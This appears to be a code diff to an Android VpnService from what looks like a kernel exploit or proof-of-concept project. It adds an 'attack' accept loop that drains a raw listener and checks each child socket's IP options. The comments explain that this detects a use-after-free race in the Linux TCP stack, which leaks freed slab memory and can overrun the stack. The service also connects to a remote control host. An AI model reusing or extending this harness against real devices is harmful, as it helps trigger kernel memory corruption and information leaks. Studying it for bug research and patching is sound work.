@@ -247,6 +247,13 @@ public class InjService extends VpnService {
             // but was really just the address not existing yet.
             probeNative();
 
+            // The attack listener needs its own accept loop: it is a raw fd, so
+            // java.net cannot touch it, and without draining its queue every
+            // later SYN is dropped as an overflow.
+            Thread attackAcceptor = new Thread(this::attackAcceptLoop, "tun-attack");
+            attackAcceptor.setDaemon(true);
+            attackAcceptor.start();
+
             control = new Socket();
             control.connect(new InetSocketAddress(CLOUD_HOST, CLOUD_PORT), CONNECT_TIMEOUT_MS);
             control.setTcpNoDelay(true);
@@ -482,6 +489,65 @@ public class InjService extends VpnService {
         } catch (Exception e) {
             Log.w(TAG, "probe reply failed: " + e);
         }
+    }
+
+    /**
+     * Accept children on the attack listener and look at each one's options.
+     *
+     * This is the direct observation of the bug. A child inherits
+     * ireq->ireq_opt in tcp_v4_syn_recv_sock, and when the request socket loses
+     * the ehash race the other child is destroyed and that same options object
+     * is freed - while this child keeps pointing at it. Reading IP_OPTIONS here
+     * then returns whatever now occupies that slab slot instead of the option
+     * bytes the SYN carried, and because getsockopt() trusts optlen it can also
+     * overrun this thread's stack.
+     *
+     * A clean run reports len=40 on every child, so any other length, any
+     * failure, or a crash in this thread is evidence that the race fired.
+     */
+    private void attackAcceptLoop() {
+        int fd = attackFd;
+        if (fd < 0) {
+            return;
+        }
+
+        long accepted = 0;
+        long anomalies = 0;
+
+        while (running.get() && attackFd == fd) {
+            int child = Native.acceptFd(fd);
+            if (child < 0) {
+                int err = -child;
+                // 11 is EAGAIN/EWOULDBLOCK, 4 is EINTR: both are retryable and
+                // must not end the loop.
+                if (err == 11 || err == 4) {
+                    continue;
+                }
+                // EBADF/ENOTSOCK mean the listener is gone; anything else is
+                // worth one line but not a spin.
+                Log.w(TAG, "attack accept failed errno=" + err);
+                break;
+            }
+
+            accepted++;
+
+            String opts = Native.readFdOptions(child);
+
+            // Every clean child carries exactly the 40 byte option the SYN had.
+            if (!opts.startsWith("len=40")) {
+                anomalies++;
+                Log.w(TAG, "CHILD OPTION ANOMALY #" + anomalies
+                        + " after " + accepted + " children: " + opts);
+            } else if (accepted % 200 == 0) {
+                Log.i(TAG, "attack accepted=" + accepted + " anomalies=" + anomalies
+                        + " last=" + opts);
+            }
+
+            Native.closeFd(child);
+        }
+
+        Log.i(TAG, "attack accept loop ended, accepted=" + accepted
+                + " anomalies=" + anomalies);
     }
 
     /**
